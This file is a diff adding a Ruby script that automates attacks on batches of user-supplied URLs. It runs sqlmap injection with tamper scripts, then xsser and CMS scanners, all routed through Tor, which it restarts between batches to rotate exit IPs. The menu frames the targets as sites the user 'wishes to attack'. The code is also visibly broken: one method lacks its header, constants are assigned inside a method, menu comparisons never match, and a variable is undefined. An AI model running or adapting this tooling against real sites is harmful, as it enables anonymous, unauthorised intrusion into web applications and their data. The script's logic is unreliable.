@@ -1,0 +1,314 @@
+#!/usr/bin/ruby
+require 'thread'
+
+puts "Input the probable backend DBMS for the web application"
+Dbms = gets.chomp
+puts "Input the tamper script you wish to use"
+Tamper = gets.chomp
+
+
+
+def threetargs
+        puts "Input the urls"
+        url1 = gets.chomp
+        url2 = gets.chomp
+        url3 = gets.chomp
+        s1 = Thread.new{`sqlmap -u #{url1} --tamper #{Tamper} --dbms #{Dbms} --random-agent --proxy socks4://127.0.0.1:9050 > sq1 `}
+        s2 = Thread.new{`sqlmap -u #{url2} --tamper #{Tamper} --dbms #{Dbms} --random-agent --proxy socks4://127.0.0.1:9050 > sq2 `}
+        s3 = Thread.new{`sqlmap -u #{url3} --tamper #{Tamper} --dbms #{Dbms} --random-agent --proxy socks4://127.0.0.1:9050 > sq3 `}
+        s1.join
+        s2.join
+        s3.join
+        `service tor restart`
+        sleep 28
+        `proxychains xsser -u #{url1} > x1`
+        `proxychains xsser -u #{url2} > x2`
+        `proxychains xsser -u #{url3} > x3`
+
+end
+
+def sixtargs
+        puts "Input the target URLs"
+        Url1 = gets.chomp
+        Url2 = gets.chomp
+        Url3 = gets.chomp
+        Url4 = gets.chomp
+        Url5 = gets.chomp
+        Url6 = gets.chomp
+
+        s1 = Thread.new{`sqlmap -u #{Url1} --tamper #{Tamper} --dbms #{Dbms} --random-agent --proxy socks4://127.0.0.1:9050 > sq1 `}
+        s2 = Thread.new{`sqlmap -u #{Url2} --tamper #{Tamper} --dbms #{Dbms} --random-agent --proxy socks4://127.0.0.1:9050 > sq2 `}
+        s3 = Thread.new{`sqlmap -u #{Url3} --tamper #{Tamper} --dbms #{Dbms} --random-agent --proxy socks4://127.0.0.1:9050 > sq3 `}
+        s1.join
+        s2.join
+        s3.join
+        `sudo service tor restart`
+        sleep 32
+        s4 = Thread.new{`sqlmap -u #{Url4} --tamper #{Tamper} --dbms #{Dbms} --random-agent --proxy socks4://127.0.0.1:9050 > sq4`}
+        s5 = Thread.new{`sqlmap -u #{Url5} --tamper #{Tamper} --dbms #{Dbms} --random-agent --proxy socks4://127.0.0.1:9050 > sq5`}
+        s6 = Thread.new{`sqlmap -u #{Url6} --tamper #{Tamper} --dbms #{Dbms} --random-agent --proxy socks4://127.0.0.1:9050 > sq6 `}
+        s4.join
+        s5.join
+        s6.join
+        `service tor restart`
+        sleep 30
+        `proxychains xsser -u #{Url1} > x1`
+        `proxychains xsser -u #{Url2} > x2`
+        `proxychains xsser -u #{Url3} > x3`
+        `proxychains xsser -u #{Url4} > x4`
+        `proxychains xsser -u #{Url5} > x5`
+        `proxychains xsser -u #{Url6} > x6`
+end 
+
+        puts "Input the target urls"
+        url1 = gets.chomp
+        url2 = gets.chomp
+        url3 = gets.chomp
+        url4 = gets.chomp
+        url5 = gets.chomp
+        url6 = gets.chomp
+        url7 = gets.chomp
+        url8 = gets.chomp
+        url9 = gets.chomp
+        s1 = Thread.new{`sqlmap -u #{url1} --tamper #{Tamper} --dbms #{Dbms} --random-agent --proxy socks4://127.0.0.1:9050 > sq1 `}
+        s2 = Thread.new{`sqlmap -u #{url2} --tamper #{Tamper} --dbms #{Dbms} --random-agent --proxy socks4://127.0.0.1:9050 > sq2 `}
+        s3 = Thread.new{`sqlmap -u #{url3} --tamper #{Tamper} --dbms #{Dbms} --random-agent --proxy socks4://127.0.0.1:9050 > sq3 `}
+        s1.join
+        s2.join
+        s3.join
+        `sudo service tor restart`
+        sleep 32
+        s4 = Thread.new{`sqlmap -u #{url4} --tamper #{Tamper} --dbms #{Dbms} --random-agent --proxy socks4://127.0.0.1:9050 > sq4`}
+        s5 = Thread.new{`sqlmap -u #{url5} --tamper #{Tamper} --dbms #{Dbms} --random-agent --proxy socks4://127.0.0.1:9050 > sq5`}
+        s6 = Thread.new{`sqlmap -u #{url6} --tamper #{Tamper} --dbms #{Dbms} --random-agent --proxy socks4://127.0.0.1:9050 > sq6 `}
+        s4.join
+        s5.join
+        s6.join
+        `sudo service tor restart`
+        sleep 32
+        s7 = Thread.new{`sqlmap -u #{url7} --tamper #{Tamper} --dbms #{Dbms} --random-agent --proxy socks4://127.0.0.1:9050 > sq7`}
+        s8 = Thread.new{`sqlmap -u #{url8} --tamper #{Tamper} --dbms #{Dbms} --random-agent --proxy socks4://127.0.0.1:9050 > sq8`}
+        s9 = Thread.new{`sqlmap -u #{url9} --tamper #{Tamper} --dbms #{Dbms} --random-agent --proxy socks4://127.0.0.1:9050 > sq9`}
+        s7.join
+        s8.join
+        s9.join
+        `service tor restart`
+        sleep 30
+        `proxychains xsser -u #{url1} > x1`
+        `proxychains xsser -u #{url2} > x2`
+        `proxychains xsser -u #{url3} > x3`
+        `proxychains xsser -u #{url4} > x4`
+        `proxychains xsser -u #{url5} > x5`
+        `proxychains xsser -u #{url6} > x6`
+        `proxychains xsser -u #{url7} > x7`
+        `proxychains xsser -u #{url8} > x8`
+        `proxychains xsser -u #{url9} > x9`
+  end 
+  
+  def twelvetargs
+        puts "input the target urls"
+        url1 = gets.chomp
+        url2 = gets.chomp
+        url3 = gets.chomp
+        url4 = gets.chomp
+        url5 = gets.chomp
+        url6 = gets.chomp
+        url7 = gets.chomp
+        url8 = gets.chomp
+        url9 = gets.chomp
+        url10 = gets.chomp
+        url11 = gets.chomp
+        url12 = gets.chomp
+
+        s1 = Thread.new{`sqlmap -u #{url1} --tamper #{Tamper} --dbms #{Dbms} --random-agent --proxy socks4://127.0.0.1:9050 > sq1 `}
+        s2 = Thread.new{`sqlmap -u #{url2} --tamper #{Tamper} --dbms #{Dbms} --random-agent --proxy socks4://127.0.0.1:9050 > sq2 `}
+        s3 = Thread.new{`sqlmap -u #{url3} --tamper #{Tamper} --dbms #{Dbms} --random-agent --proxy socks4://127.0.0.1:9050 > sq3 `}
+        s1.join
+        s2.join
+        s3.join
+        `sudo service tor restart`
+        sleep 32
+        s4 = Thread.new{`sqlmap -u #{url4} --tamper #{Tamper} --dbms #{Dbms} --random-agent --proxy socks4://127.0.0.1:9050 > sq4`}
+        s5 = Thread.new{`sqlmap -u #{url5} --tamper #{Tamper} --dbms #{Dbms} --random-agent --proxy socks4://127.0.0.1:9050 > sq5`}
+        s6 = Thread.new{`sqlmap -u #{url6} --tamper #{Tamper} --dbms #{Dbms} --random-agent --proxy socks4://127.0.0.1:9050 > sq6 `}
+        s4.join
+        s5.join
+        s6.join
+
+        `sudo service tor restart`
+        sleep 32
+        s7 = Thread.new{`sqlmap -u #{url7} --tamper #{Tamper} --dbms #{Dbms} --random-agent --proxy socks4://127.0.0.1:9050 > sq7`}
+        s8 = Thread.new{`sqlmap -u #{url8} --tamper #{Tamper} --dbms #{Dbms} --random-agent --proxy socks4://127.0.0.1:9050 > sq8`}
+        s9 = Thread.new{`sqlmap -u #{url9} --tamper #{Tamper} --dbms #{Dbms} --random-agent --proxy socks4://127.0.0.1:9050 > sq9`}
+        s7.join
+        s8.join
+        s9.join
+        `sudo service tor restart`
+        sleep 32
+
+        s10 = Thread.new{`sqlmap -u #{url10} --tamper #{Tamper} --dbms #{Dbms} --random-agent --proxy socks4://127.0.0.1:9050 > sq10`}
+        s11 = Thread.new{`sqlmap -u #{url11} --tamper #{Tamper} --dbms #{Dbms} --random-agent --proxy socks4://127.0.0.1:9050 > sq11`}
+        s12 = Thread.new{`sqlmap -u #{url12} --tamper #{Tamper} --dbms #{Dbms} --random-agent --proxy socks4://127.0.0.1:9050 > sq12`}
+
+        s10.join
+        s11.join
+        s12.join
+        `sudo service tor restart`
+        sleep 35
+
+        `proxychains xsser -u #{url1} > x1`
+        `proxychains xsser -u #{url2} > x2`
+        `proxychains xsser -u #{url3} > x3`
+        `proxychains xsser -u #{url4} > x4`
+        `proxychains xsser -u #{url5} > x5`
+        `proxychains xsser -u #{url6} > x6`
+        `proxychains xsser -u #{url7} > x7`
+        `proxychains xsser -u #{url8} > x8`
+        `proxychains xsser -u #{url9} > x9`
+        `proxychains xsser -u #{url10} > x10`
+        `proxychains xsser -u #{url11} > x11`
+        `proxychains xsser -u #{url12} > x12`
+end 
+
+def fifteentargs
+        puts "input the target urls"
+        url1 = gets.chomp
+        url2 = gets.chomp
+        url3 = gets.chomp
+        url4 = gets.chomp
+        url5 = gets.chomp
+        url6 = gets.chomp
+        url7 = gets.chomp
+        url8 = gets.chomp
+        url9 = gets.chomp
+        url10 = gets.chomp
+        url11 = gets.chomp
+        url12 = gets.chomp
+        url13 = gets.chomp
+        url14 = gets.chomp
+        url15 = gets.chomp
+
+        s1 = Thread.new{`sqlmap -u #{url1} --tamper #{Tamper} --dbms #{Dbms} --random-agent --proxy socks4://127.0.0.1:9050 > sq1 `}
+        s2 = Thread.new{`sqlmap -u #{url2} --tamper #{Tamper} --dbms #{Dbms} --random-agent --proxy socks4://127.0.0.1:9050 > sq2 `}
+        s3 = Thread.new{`sqlmap -u #{url3} --tamper #{Tamper} --dbms #{Dbms} --random-agent --proxy socks4://127.0.0.1:9050 > sq3 `}
+        s1.join
+        s2.join
+        s3.join
+        `sudo service tor restart`
+        sleep 32
+        s4 = Thread.new{`sqlmap -u #{url4} --tamper #{Tamper} --dbms #{Dbms} --random-agent --proxy socks4://127.0.0.1:9050 > sq4`}
+        s5 = Thread.new{`sqlmap -u #{url5} --tamper #{Tamper} --dbms #{Dbms} --random-agent --proxy socks4://127.0.0.1:9050 > sq5`}
+        s6 = Thread.new{`sqlmap -u #{url6} --tamper #{Tamper} --dbms #{Dbms} --random-agent --proxy socks4://127.0.0.1:9050 > sq6 `}
+
+        s4.join
+        s5.join
+        s6.join
+        `sudo service tor restart`
+        sleep 32
+        s7 = Thread.new{`sqlmap -u #{url7} --tamper #{Tamper} --dbms #{Dbms} --random-agent --proxy socks4://127.0.0.1:9050 > sq7`}
+        s8 = Thread.new{`sqlmap -u #{url8} --tamper #{Tamper} --dbms #{Dbms} --random-agent --proxy socks4://127.0.0.1:9050 > sq8`}
+        s9 = Thread.new{`sqlmap -u #{url9} --tamper #{Tamper} --dbms #{Dbms} --random-agent --proxy socks4://127.0.0.1:9050 > sq9`}
+        s7.join
+        s8.join
+        s9.join
+        `sudo service tor restart`
+        sleep 32
+
+        s10 = Thread.new{`sqlmap -u #{url10} --tamper #{Tamper} --dbms #{Dbms} --random-agent --proxy socks4://127.0.0.1:9050 > sq10`}
+        s11 = Thread.new{`sqlmap -u #{url11} --tamper #{Tamper} --dbms #{Dbms} --random-agent --proxy socks4://127.0.0.1:9050 > sq11`}
+        s12 = Thread.new{`sqlmap -u #{url12} --tamper #{Tamper} --dbms #{Dbms} --random-agent --proxy socks4://127.0.0.1:9050 > sq12`}
+
+        s10.join
+        s11.join
+        s12.join
+        `sudo service tor restart`
+        sleep 35
+
+
+        s13 = Thread.new{`sqlmap -u #{url13} --tamper #{Tamper} --dbms #{Dbms} --random-agent --proxy socks4://127.0.0.1:9050 > sq10`}
+        s14 = Thread.new{`sqlmap -u #{url14} --tamper #{Tamper} --dbms #{Dbms} --random-agent --proxy socks4://127.0.0.1:9050 > sq11`}
+        
+
+
+
+
+
+s15 = Thread.new{`sqlmap -u #{url15} --tamper #{Tamper} --dbms #{Dbms} --random-agent --proxy socks4://127.0.0.1:9050 > sq12`}
+
+        s13.join
+        s14.join
+        s15.join
+        `sudo service tor restart`
+        sleep 35
+
+        `proxychains xsser -u #{url1} > x1`
+        `proxychains xsser -u #{url2} > x2`
+        `proxychains xsser -u #{url3} > x3`
+        `proxychains xsser -u #{url4} > x4`
+        `proxychains xsser -u #{url5} > x5`
+        `proxychains xsser -u #{url6} > x6`
+        `proxychains xsser -u #{url7} > x7`
+        `proxychains xsser -u #{url8} > x8`
+        `proxychains xsser -u #{url9} > x9`
+        `proxychains xsser -u #{url10} > x10`
+        `proxychains xsser -u #{url11} > x11`
+        `proxychains xsser -u #{url12} > x12`
+        `proxychains xsser -u #{url13} > x13`
+        `proxychains xsser -u #{url14} > x14`
+        `proxychains xsser -u #{url15} > x15`
+end
+
+def controlflow
+        puts "Select the number of urls you wish to attack"
+        puts "1 is to attack three urls"
+        puts "2 is to attack six urls"
+        puts "3 is to attack nine urls"
+        puts "4 is to attack twelve urls"
+        puts "5 is to attack fifteen urls"
+
+        task = gets.chomp
+
+        if task == 1
+                threetargs
+        elsif task == 2
+                sixtargs
+        elsif task == 3
+                ninetargs
+        elsif task == 4
+                twelvetargs
+        elsif task == 5
+                fifteentargs
+        end
+
+
+        puts "Is there a CMS if so which CMS do you wish to scan"
+        puts "1 is for yes"
+        puts "2 is for no"
+        choice
+        if choice == 1
+                cmscontrol
+        elsif choice == 2
+                exit
+        end
+end
+def cmscontrol
+
+        puts "1 is for Drupal"
+        puts "2 is for Joomla"
+        puts "3 is for wordpress"
+        puts "4 is for xcart scan"
+        cms = gets.chomp
+        puts "Input the web applications base url"
+        sitebase = gets.chomp
+        if cms == 1
+                `proxychains droopescan scan drupal -u #{sitebase} > cmsscan.txt`
+        elsif cms == 2
+                `joomscan -u #{sitebase} -x socks4://127.0.0.1:9050 > cmsscan.txt`
+        elsif cms == 3
+                `wpscan --url #{sitebase} --proxy socks4://127.0.0.1:9050 --random-agent > cmsscan.txt`
+        end
+end
+
+
+
+
